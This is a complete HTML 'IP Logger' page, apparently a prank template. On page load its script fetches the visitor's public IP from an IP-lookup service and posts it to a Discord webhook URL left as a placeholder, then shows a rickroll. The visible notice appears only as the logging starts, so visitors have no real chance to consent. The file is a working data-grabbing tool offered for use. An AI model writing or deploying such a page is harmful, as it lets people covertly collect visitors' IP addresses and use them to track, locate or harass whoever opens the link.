<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            color: #333;
            text-align: center;
            padding: 50px;
        }
        h1 {
            color: #4A90E2;
        }
        .container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
            margin: auto;
            max-width: 500px;
        }
        .embed {
            background: #d9edf7;
            border-left: 5px solid #31708f;
            padding: 10px;
            text-align: left;
            margin-top: 20px;
        }
        .embed h2 {
            color: #31708f;
        }
        .embed a {
            color: #31708f;
        }
    </style>
    <script>
        async function sendIP() {
            try {
                // Fetch the user's IP address
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;

                // Your Discord webhook URL
                const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL';

                // Create an embed message for Discord
                const embed = {
                    title: "User IP Information",
                    color: 3447003, // A nice blue color
                    fields: [
                        { name: "IP Address", value: `**${userIP}**`, inline: true }
                    ]
                };

                // Send the IP address to the Discord webhook
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ embeds: [embed] })
                });

                console.log('IP information sent to Discord:', embed);

                // Display rickroll embed on the website
                document.getElementById('rickroll').innerHTML = `
                    <h2>You've been Rickrolled!</h2>
                    <p>ðŸŽµ Never gonna give you up, never gonna let you down! ðŸŽµ</p>
                    <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ" target="_blank">Watch the rickroll video!</a>
                    <br>
                    <img src="https://media.giphy.com/media/xT39D7y9F8c0wVLV5e/giphy.gif" alt="Rickroll GIF" style="width: 100%; max-width: 400px; border-radius: 8px; margin-top: 10px;">
                `;
            } catch (error) {
                console.error('Error sending IP information:', error);
            }
        }

        // Call the function when the page loads
        window.onload = sendIP;
    </script>
</head>
<body>
    <div class="container">
        <h1>Welcome!</h1>
        <p>Your IP address is being logged.</p>
        <div id="rickroll" class="embed"></div>
    </div>
</body>
</html>
